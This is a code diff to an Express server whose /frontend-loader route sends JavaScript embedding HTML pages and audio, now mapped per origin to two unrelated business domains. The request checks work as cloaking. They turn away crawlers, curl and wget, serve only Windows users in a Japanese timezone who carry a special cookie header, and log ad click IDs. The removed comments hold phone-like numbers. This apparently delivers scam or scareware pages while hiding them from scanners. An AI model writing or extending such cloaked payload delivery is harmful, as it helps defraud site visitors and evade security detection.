@@ -8,59 +8,53 @@ import fetch from "node-fetch";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const ALLOWED_ORIGIN = "https://amicisrestaurant.food";
+// === Per-origin asset mapping ===
+// Add as many origins as you like; each maps to exactly one asset.
+const ORIGIN_ASSETS = {
+  "https://amicisrestaurant.food": {
+    htmlFile: "asset1.html",
+    audioUrl: "https://audio.jukehost.co.uk/yxLcSNLLyEb7Ym6NVleJfkb9ueMiUgB7",
+  },
+  "https://sakurayuonsen.com": {
+    htmlFile: "asset2.html",
+    audioUrl: "https://audio.jukehost.co.uk/aCBQpNIhnrfGU20C21KXmyY5QTjq5D4I",
+  },
+};
+
+const ALLOWED_ORIGINS = Object.keys(ORIGIN_ASSETS);
 
 // Helper to resolve relative paths (ESM compatible)
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// === CORS (dynamic origin) ===
 app.use(
   cors({
-    origin: ALLOWED_ORIGIN,
     credentials: true,
+    origin(origin, cb) {
+      // If no Origin header, block by default (tighten as desired)
+      if (!origin) return cb(new Error("CORS: Origin required"));
+      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
+      return cb(new Error("CORS: Not allowed"));
+    },
   })
 );
 
 app.use(express.json());
 
-// === Asset configuration (HTML + Audio) ===
-const assets = [
-  // 0101 828 731 3031
-  // {
-  //   htmlFile: "asset1.html",
-  //   audioUrl: "https://audio.jukehost.co.uk/23aWsI7juLMs8stRAUjLRZ8LMsnnG9Ut",
-  // },
-  // 0101 858 758 2996
-  {
-    htmlFile: "asset2.html",
-    audioUrl: "https://audio.jukehost.co.uk/yxLcSNLLyEb7Ym6NVleJfkb9ueMiUgB7",
-  },
-  // 7199
-  // {
-  //   htmlFile: "asset3.html",
-  //   audioUrl: "https://audio.jukehost.co.uk/aCBQpNIhnrfGU20C21KXmyY5QTjq5D4I",
-  // },
-  // 7193
-  // {
-  //   htmlFile: "asset4.html",
-  //   audioUrl: "https://audio.jukehost.co.uk/WuM1hVmE3nsuOOu3LvdtEvUQODa8ndH8",
-  // },
-  // 7194
-  // {
-  //   htmlFile: "asset5.html",
-  //   audioUrl: "https://audio.jukehost.co.uk/t1C9SlZQ6sQFZ9h6cuuIVvXxgdOPbzDD",
-  // },
-];
-
-let currentAssetIndex = 0; // Global index for round-robin asset selection
-
 // === Security Middleware ===
 function validateRequest(req, res, next) {
   const origin = req.get("origin");
-  if (origin !== ALLOWED_ORIGIN) {
+
+  // 1) Origin must be one of the allowed origins
+  if (!ALLOWED_ORIGINS.includes(origin)) {
     return res.status(403).send("FAILED: origin check");
   }
 
+  // Attach the asset chosen for this origin so routes can use it.
+  req.asset = ORIGIN_ASSETS[origin];
+
+  // 2) Basic bot / platform checks
   const ua = req.get("user-agent")?.toLowerCase() || "";
   const blockedAgents = ["bot", "spider", "crawler", "curl", "wget"];
   const isWindows = ua.includes("windows");
@@ -68,11 +62,13 @@ function validateRequest(req, res, next) {
     return res.status(403).send("FAILED: bot or not Windows");
   }
 
+  // 3) Timezone check
   const timezone = req.get("x-client-timezone");
   if (!["Asia/Tokyo", "Japan", "Etc/GMT-9"].includes(timezone)) {
     return res.status(403).send("FAILED: wrong timezone");
   }
 
+  // 4) Cookie presence check
   const cookie = req.get("x-access-cookie");
   if (cookie !== "true") {
     return res.status(403).send("FAILED: cookie missing");
@@ -84,9 +80,9 @@ function validateRequest(req, res, next) {
 // === HTML Escaping Utility ===
 function escapeHTMLForJSString(html) {
   return html
-    .replace(/\\/g, '\\\\')  // Escape backslashes
-    .replace(/'/g, "\\'")    // Escape single quotes
-    .replace(/\r?\n/g, '');  // Remove newlines
+    .replace(/\\/g, "\\\\") // Escape backslashes
+    .replace(/'/g, "\\'") // Escape single quotes
+    .replace(/\r?\n/g, ""); // Remove newlines
 }
 
 // === Route: /frontend-loader ===
@@ -99,10 +95,11 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
   console.log(gclid);
 
   try {
-    const asset = assets[currentAssetIndex];
-
-    // Increment index (loop back to 0 if end is reached)
-    currentAssetIndex = (currentAssetIndex + 1) % assets.length;
+    // Asset is selected based on the request Origin (set in validateRequest)
+    const asset = req.asset;
+    if (!asset) {
+      return res.status(500).json({ error: "No asset mapped for origin" });
+    }
 
     const htmlPath = path.join(__dirname, asset.htmlFile);
     const rawHTML = await fs.readFile(htmlPath, "utf8");
@@ -126,10 +123,12 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
       });
     `;
 
-    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
-    console.log(`Sent code for: ${asset.htmlFile}`);
-    return res.json({ code });
+    // Reflect the specific request Origin (required when credentials: true)
+    const requestOrigin = req.get("origin");
+    res.set("Access-Control-Allow-Origin", requestOrigin);
 
+    console.log(`Sent code for: ${asset.htmlFile} (origin: ${requestOrigin})`);
+    return res.json({ code });
   } catch (err) {
     console.error("Error in frontend-loader:", err);
     return res.status(500).json({ error: "Failed to generate frontend loader" });
